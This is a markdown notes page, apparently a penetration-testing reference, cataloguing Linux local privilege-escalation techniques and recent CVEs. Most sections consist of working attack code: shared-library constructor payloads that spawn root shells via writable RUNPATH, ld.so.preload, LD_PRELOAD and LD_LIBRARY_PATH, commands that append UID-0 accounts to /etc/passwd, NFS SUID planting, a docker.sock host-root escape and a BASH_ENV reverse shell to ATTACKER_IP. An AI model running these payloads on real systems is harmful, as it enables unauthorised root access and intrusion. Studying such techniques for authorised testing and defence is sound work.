+++
title = 'Miscellaneous Techniques'
date = 2026-10-30
type = 'notes'
weight = 60
toc = true
tags = ['linux', 'privilege-escalation', 'kernel', 'container-escape']
+++

Techniques in this file do not fit neatly into SUID, sudo, or cron. They are grouped by **what you control** — a library path, an export, a socket, an environment variable, or a file permission — because that is how you will find them during enumeration.

---

## 1. Shared Object Hijacking — `RUNPATH` / `RPATH` / `$ORIGIN`

A binary that uses a custom library can be enumerated with:

```bash
ldd /path/to/program
readelf -d /path/to/program | grep -E 'RPATH|RUNPATH|NEEDED'
```

`RUNPATH` and `RPATH` are **baked into the binary** and are searched before the default library paths. Unlike `LD_LIBRARY_PATH`, they are **honoured for SUID binaries**, which is what makes a writable `RUNPATH` directory a reliable escalation.

### The `$ORIGIN` and empty-entry traps

Two variants are easy to miss:

- **`$ORIGIN`** expands to the directory containing the binary. If that directory is writable, you can plant a malicious library and it will be loaded on the next execution.
- **A trailing or empty `RUNPATH` entry** (`lib:/opt/app/lib:`) is interpreted by `ld.so` as the **current working directory**. If you can control the working directory of the privileged process — a service with `WorkingDirectory=` pointing at a writable path, or a cron job that `cd`s before executing — you can plant a library there.

Real example: **clang-query-21** shipped with `RUNPATH` ending in a trailing colon, allowing a local attacker to execute code by creating a `libm.so.6` in the current directory. The same pattern appears in custom SUID binaries built with `-Wl,-rpath,'$ORIGIN/lib:'`.

### Exploitation

```bash
# 1. Identify a writable RUNPATH/RPATH entry
readelf -d /path/to/suid | grep -E 'RPATH|RUNPATH'

# 2. Identify the soname the binary needs
ldd /path/to/suid | grep 'not found'
readelf -d /path/to/suid | grep NEEDED

# 3. Payload (constructor — no signature matching needed)
cat > /tmp/evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF

# 4. Compile with the exact soname
gcc -shared -fPIC -nostartfiles -o /writable/rpath/libcustom.so.1 /tmp/evil.c

# 5. Trigger the binary
/path/to/suid
```

### Recent library-loading CVEs

**CVE-2026-86805 — glibc `ld.so` TOCTOU with `$ORIGIN` (glibc 2.14 – 2.44)**  
When expanding `$ORIGIN` in `DT_RPATH` for setuid/setgid binaries, glibc validates the **lexically normalised** path against trusted directories but opens the **raw, un-normalised** path. If `fs.protected_hardlinks` is disabled and you can hard-link the SUID binary into an attacker-controlled directory, you can race a path component with a symlink and redirect the loader outside the trusted directory. Check:

```bash
sysctl fs.protected_hardlinks            # 0 = exploitable
cat /proc/sys/kernel/yama/ptrace_scope   # not required, but relevant for other paths
```

**CVE-2025-4802 — statically linked SUID/SGID glibc `dlopen` (glibc 2.27 – 2.38)**  
A **statically linked** setuid binary that calls `dlopen()` (including internal calls after `setlocale` or NSS functions such as `getaddrinfo`) may incorrectly search `LD_LIBRARY_PATH` and load an attacker-controlled library. Static SUID binaries are often treated as safe from library hijacking; this CVE breaks that assumption.

```bash
ldd /path/to/suid 2>&1 | grep "not a dynamic executable"   # static SUID?
dpkg -l libc6 2>/dev/null | grep libc6                      # glibc version
```

### `ld.so.preload` — the universal hijack

If `/etc/ld.so.preload` is writable (or its parent directory is), every dynamically linked binary — **including SUID binaries** — loads your library before anything else. This works regardless of which SUID binary exists.

```bash
ls -la /etc/ld.so.preload 2>/dev/null
echo '/tmp/evil.so' > /etc/ld.so.preload
# any subsequent SUID execution drops a root shell
```

---

## 2. Weak NFS Privileges

NFS exports are enumerated remotely with:

```bash
showmount -e target-ip
```

Locally, `/etc/exports` shows the configured options. The classic primitive is **`no_root_squash`**: the server honours the client's UID, so root on the attacker box can create root-owned files on the export.

### `no_root_squash` exploitation

```bash
# 1. Confirm no_root_squash
cat /etc/exports | grep no_root_squash
showmount -e target-ip

# 2. On the attacker box as root:
mkdir /mnt/nfs
mount -t nfs target-ip:/tmp /mnt/nfs

# 3. Copy a SUID payload
cp /bin/bash /mnt/nfs/rootbash
chmod u+s /mnt/nfs/rootbash

# 4. On the target (low-priv shell):
/tmp/rootbash -p
```

### CVE-2025-12801 — `rpc.mountd` export-option bypass

A flaw in **rpc.mountd** allows an NFSv3 client to **escalate the privileges assigned in `/etc/exports` at mount time**, accessing any subdirectory or subtree of an exported directory **regardless of `root_squash` or `all_squash`**. This matters when `no_root_squash` is *not* set: the vulnerability provides an equivalent primitive by bypassing the squash attributes entirely. Check the `nfs-utils` version:

```bash
rpm -qa nfs-utils 2>/dev/null; dpkg -l nfs-utils 2>/dev/null
```

Fixed in `nfs-utils` **1:2.8.6-1** and later.

---

## 3. Terminal Session Hijacking — `tmux` and `screen`

A detached `tmux` or `screen` session running as root, whose **socket is accessible** to you, is a direct shell as that user. The socket is normally `700`, owned by the creator, in `/tmp/tmux-<uid>/` or `/tmp/screen/`. The prerequisite is **socket access**, not membership in `dev` or any other group.

### Enumeration

```bash
ps aux | grep -E 'tmux|screen'
find /tmp /run /var/tmp /dev/shm -name 'tmux-*' -o -name 'screen.*' 2>/dev/null
ls -la /tmp/tmux-* 2>/dev/null
```

### Hijacking

```bash
# tmux
tmux -S /tmp/tmux-0/default attach -t <session>

# screen
screen -r <session>
```

If the socket is world-readable or group-accessible (a common misconfiguration when root starts a shared session), no exploit is required — you attach and inherit root's shell.

> **Legacy note:** Older systems sometimes ship **SUID `screen` (CVE-2017-5618)**, which is a direct local-root primitive independent of session hijacking. Check with `ls -l $(which screen)`.

---

## 4. Python Library Hijacking

A Python **script** cannot be SUID — the kernel ignores setuid on shebang scripts. The realistic scenarios are:

1. A Python script executed as **root** by cron, systemd, or `sudo`.
2. A **SUID Python interpreter** that runs a script you control.

### 1. Writable module in the import path

`sys.path` order decides which module wins:

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

The **script's own directory** is first (or the current directory for `python3 -c`), followed by `PYTHONPATH`, then the standard library and `site-packages`. A **writable script directory** is the easiest hijack.

```bash
# Read the imports
grep -E '^(import|from) ' /opt/script.py

# If the script imports `module` and its directory is writable:
cat > /opt/module.py <<'EOF'
import os
os.system("/bin/bash -p")
EOF
```

The next root execution imports your module and runs the payload as root.

### 2. Writable library file

If the actual module file (e.g. `/usr/local/lib/python3.8/dist-packages/lib/__init__.py`) is writable, prepend the payload.

### 3. `PYTHONPATH` via `sudo`

```bash
sudo -l | grep PYTHONPATH
# (root) SETENV: /usr/bin/python3 /opt/script.py

mkdir -p /tmp/pymod
cat > /tmp/pymod/module.py <<'EOF'
import os
os.system("/bin/bash -p")
EOF

sudo PYTHONPATH=/tmp/pymod /usr/bin/python3 /opt/script.py
```

### 4. `sitecustomize.py` / `usercustomize.py` / `.pth`

If `site-packages` is writable, dropping `sitecustomize.py` executes code at **interpreter startup for every Python process** — powerful but noisy.

```bash
python3 -c 'import site; print(site.getsitepackages())'
ls -ld $(python3 -c 'import site; print(" ".join(site.getsitepackages()))')
```

### Recent Python-specific CVE

**CVE-2025-69257 — `theshit` loads user-owned rules as root**  
A local privilege escalation from unsafe loading of user-owned Python rules when running as root; fixed in `0.1.1`. This is representative of a broader class: any root-run Python tool that loads plugins, rules, or configuration from a user-writable path is a candidate.

---

## 5. Writable `/etc/passwd` and `/etc/shadow`

If `/etc/passwd` is writable, you can add a UID-0 account without knowing any password:

```bash
ls -la /etc/passwd /etc/shadow

# Generate a hash — do NOT paste example hashes, the salt is random
openssl passwd -6 'w00t'        # SHA-512 (modern default)
openssl passwd -1 -salt xyz 'w00t'   # MD5-crypt (legacy)

# Append a UID-0 account
echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

If `openssl` is unavailable:

```bash
python3 -c "import crypt; print(crypt.crypt('w00t', crypt.mksalt(crypt.METHOD_SHA512)))"
```

If `/etc/shadow` is writable, replace the root hash or add an entry. If it is **readable** (e.g. you are in the `shadow` group), `unshadow` and crack offline:

```bash
unshadow /etc/passwd /etc/shadow > /tmp/hashes
```

### Container-specific writable `/etc/passwd` (2025 CVEs)

Several container images ship `/etc/passwd` **group-writable** at build time. A non-root user who is a member of the `root` group can modify it and add a UID-0 account.

- **CVE-2025-57853** — Web Terminal images
- **CVE-2025-58713** — Red Hat Process Automation Manager 7
- **CVE-2025-57850** — CodeReady Workspaces

Check inside a container:

```bash
ls -la /etc/passwd
id   # are you in the root group?
```

---

## 6. Preserved Environment Variables — `BASH_ENV`, `LD_PRELOAD`, and `env_keep`

`sudo -l` output is the primary enumeration source. Look for:

- `env_keep += BASH_ENV`
- `env_keep += LD_PRELOAD`
- `env_keep += LD_LIBRARY_PATH`
- `env_keep += PYTHONPATH`
- `SETENV` on any allowed command

### `BASH_ENV` via `env_keep`

`BASH_ENV` instructs bash to source a file at the start of every **non-interactive** shell. If sudo preserves it, any allowed command that spawns a shell will run your file as root.

```bash
sudo -l | grep BASH_ENV

echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /tmp/exploit
chmod +x /tmp/exploit

export BASH_ENV=/tmp/exploit
sudo /path/to/allowed-binary
```

This exact chain — `env_keep+=BASH_ENV` abused to set a reverse-shell payload — is documented in real privilege-escalation walkthroughs.

> **Caveat:** `BASH_ENV` is only sourced by bash. If the allowed command runs `/bin/sh` (dash on Debian/Ubuntu), this will not fire.

### `LD_PRELOAD` via `env_keep` or `SETENV`

```bash
sudo -l | grep LD_PRELOAD

cat > /tmp/preload.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/allowed-command
```

If sudo reports “sorry, you are not allowed to set the following environment variables”, the `env_keep`/`SETENV` prerequisite is not met.

### `LD_LIBRARY_PATH` via `env_keep` or `SETENV`

Plant a fake version of any library the allowed command loads:

```bash
ldd /usr/sbin/allowed-binary            # identify a library
cat > /tmp/libtarget.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/libtarget.so.1 /tmp/libtarget.c
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/allowed-binary
```

### Recent `LD_PRELOAD` / environment-trust CVEs

**CVE-2025-32463 (“chwoot”) — sudo `-R` / nsswitch (sudo 1.9.14 – 1.9.17)**  
`sudo -R <attacker-writable-dir>` changes root before NSS resolution. Plant `etc/nsswitch.conf` pointing at a malicious `libnss_*.so.2`; sudo loads and executes it **as root before the sudoers policy is evaluated**. Requires only that you have **any** sudo rule, not a specific one. CVSS 9.3.

```bash
sudo --version | head -1
sudo -l                          # any rule is enough
```

**CVE-2026-53614 — SUID `mount(8)` / `LIBMOUNT_FORCE_MOUNT2` (util-linux 2.39.1 – 2.41.4, 2.42 – 2.42.1)**  
The SUID `mount` utility reads `LIBMOUNT_FORCE_MOUNT2` with `getenv()` and does **not** filter it via `safe_getenv()` in SUID context. This forces the non-atomic legacy bind-mount path. With an `/etc/fstab` bind mount authorised by `user` or `users` and protected by `nosuid`, `noexec`, or `nodev`, you can race the window between the initial bind mount and the remount that applies the security flags, executing a SUID program from the temporarily unprotected mount. Fixed in **2.41.5** and **2.42.2**.

```bash
mount --version
grep -E 'user|users' /etc/fstab
```

**CVE-2026-24061 — GNU InetUtils `telnetd` / `USER` environment variable (1.9.3 – 2.7)**  
`telnetd` passes the client-supplied `USER` environment variable directly to `/usr/bin/login` without sanitisation. Setting `USER=-f root` and connecting with `telnet -a` bypasses authentication and returns a root shell. CVSS 9.8, network-reachable, no privileges required.

```bash
telnetd --version 2>/dev/null
ps aux | grep telnetd
```

---

## 7. Kernel Page-Cache Corruption (2026)

A distinct family of **deterministic logic flaws** lets an unprivileged user write into the page cache of a root-owned SUID binary. The corrupted page is never marked dirty, so the on-disk file is unchanged — **hash-based monitoring and file-integrity tools cannot see the modification**.

### CVE-2026-31431 — Copy Fail

4-byte write into the page cache of any readable file via `algif_aead` (AF_ALG). A **732-byte Python PoC** modifies a SUID binary in memory and escalates to root. Affects kernels released since **2017**; CISA added it to the Known Exploited Vulnerabilities catalog.

```bash
cat /proc/crypto | grep -i aead
```

### CVE-2026-43284 + CVE-2026-43500 — Dirty Frag

Chains **xfrm-ESP** page-cache write (CVE-2026-43284) with **RxRPC** page-cache write (CVE-2026-43500). The ESP flaw bypasses Copy-on-Write protections and performs **48 separate 4-byte writes to overwrite the first 192 bytes of `/usr/bin/su`** with a custom root-shell ELF. No race condition; high success rate. Affects Ubuntu 24.04.4, RHEL 10.1, openSUSE, CentOS Stream 10, AlmaLinux 10, Fedora 44.

```bash
lsmod | grep -E 'xfrm|rxrpc'
sysctl kernel.unprivileged_userns_clone
```

> **Why this matters for Miscellaneous Techniques:** Copy Fail and Dirty Frag target SUID binaries. If you have a SUID inventory but no GTFOBins entry and no writable `RUNPATH`, these bugs turn *any* readable SUID binary into a root primitive — without touching disk.

---

## 8. Container Escapes — `runc` and Runtime Sockets

### `docker.sock` / `containerd.sock`

A reachable runtime socket is a direct host-root primitive:

```bash
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null

docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu chroot /host bash
```

### `runc` CVEs (2025)

These allow escape **without daemon socket exposure**, provided you can influence container configuration or image content:

| CVE | Primitive |
|---|---|
| **CVE-2025-31133** | “Masked path” abuse / mount race conditions; bind-mounts the symlink target read-write |
| **CVE-2025-52565** | `/dev/console` mount race; write to hazardous procfs paths |
| **CVE-2025-52881** | Arbitrary write gadgets and procfs write redirects; bypasses LSM labels |

Fixed in **runc 1.2.8, 1.3.3, 1.4.0-rc.3**.

```bash
runc --version
ctr version 2>/dev/null
```

---

## 9. Polkit and AD-Joined Hosts

### Polkit — still producing LPEs

**CVE-2026-4897** is a `polkit-agent-helper-1` unbounded stdin read that causes an OOM / denial of service rather than privilege escalation — useful to know so you do not over-invest. PwnKit (**CVE-2021-4034**) remains the polkit root primitive.

```bash
pkexec --version
ls -l /usr/bin/pkexec
```

### AD-joined Linux — SSSD (CVE-2025-11561)

On AD-joined hosts with **SSSD**, the default Kerberos configuration enables `sssd_krb5_localauth_plugin` but allows a fallback to the **`an2ln` plugin**. An attacker with permission to modify certain AD attributes — such as `userPrincipalName` or `samAccountName` — can impersonate privileged users and escalate on the domain-joined Linux host.

```bash
realm list
ps aux | grep sssd
cat /etc/sssd/sssd.conf 2>/dev/null
```

---

## 10. Enumeration Tools for Miscellaneous Vectors

| Tool | What it adds |
|---|---|
| **privmap** | Models users, groups, sudo rules, file permissions, cron, systemd, capabilities, and processes as a **directed property graph** and traces concrete escalation paths. Instead of “this file is world-writable” and “this cron job runs as root” as separate findings, it reports `www-data → writable logrotate config → root cron → root` |
| **uptux** | Specialised in systemd, D-Bus, socket units, and writable unit paths |
| **SUDO_KILLER** | Sudo misconfigurations, CVE detection, and token reuse |

```bash
pip install privmap
sudo privmap

wget https://raw.githubusercontent.com/initstring/uptux/master/uptux.py
python3 uptux.py
```

---

## Triage — Stop at the First Hit

Run these in order. Most boxes fall in the first three checks; only continue if they fail.

```bash
# 1. Is /etc/passwd or /etc/shadow writable? (30-second root)
ls -la /etc/passwd /etc/shadow

# 2. Is /etc/ld.so.preload writable? (universal linker hijack)
ls -la /etc/ld.so.preload 2>/dev/null

# 3. Does sudo preserve anything dangerous?
sudo -l | grep -E 'env_keep|SETENV'

# 4. Does any SUID binary have a writable RUNPATH or a missing library?
find / -perm -4000 -type f 2>/dev/null | while read b; do
    readelf -d "$b" 2>/dev/null | grep -E 'RPATH|RUNPATH' && echo "  ^ $b"
done

# 5. Is there an accessible root tmux/screen socket?
find /tmp /run -name 'tmux-*' -o -name 'screen.*' 2>/dev/null

# 6. NFS no_root_squash (or CVE-2025-12801)
cat /etc/exports 2>/dev/null | grep no_root_squash

# 7. Only if none of the above:
uname -r; cat /proc/crypto | grep -i aead; lsmod | grep -E 'xfrm|rxrpc'
```

---

## Quick Reference — Technique → Precondition → Payoff

| Technique | Precondition | Payoff |
|---|---|---|
| **Writable `RUNPATH` / `$ORIGIN`** | Writable directory in the loader path | Root via constructor library |
| **`ld.so.preload` writable** | File or parent directory writable | Root on next SUID execution |
| **NFS `no_root_squash`** | Export option present | Root-owned SUID file on export |
| **`rpc.mountd` CVE-2025-12801** | Vulnerable `nfs-utils`, NFSv3 | Bypasses squash attributes |
| **tmux/screen socket** | Socket accessible to you | Root shell in existing session |
| **Python writable module dir** | Root-run script, writable `sys.path[0]` | Root on next execution |
| **Writable `/etc/passwd`** | File writable | UID-0 account |
| **`BASH_ENV` via `env_keep`** | `sudo -l` preserves it | Root via any shell-spawning sudo command |
| **`LD_PRELOAD` via `env_keep`/`SETENV`** | Preserved by sudo | Root via constructor library |
| **sudo CVE-2025-32463** | sudo 1.9.14 – 1.9.17, any sudo rule | Root before policy evaluation |
| **Copy Fail CVE-2026-31431** | Kernel ≥ 4.17, `algif_aead` | Root via page-cache write to SUID |
| **Dirty Frag CVE-2026-43284** | `xfrm`/`rxrpc` loaded | Root via page-cache overwrite of `/usr/bin/su` |
| **runc CVE-2025-31133/52565/52881** | Vulnerable runc, container config influence | Host escape |

---

This file is designed to sit alongside the **Capabilities Abuse** and **Environment Variables Abuse** notes: capabilities bypass the need for environment inheritance, and environment variables bypass the need for file permissions. Check all three during enumeration before moving to kernel exploits.
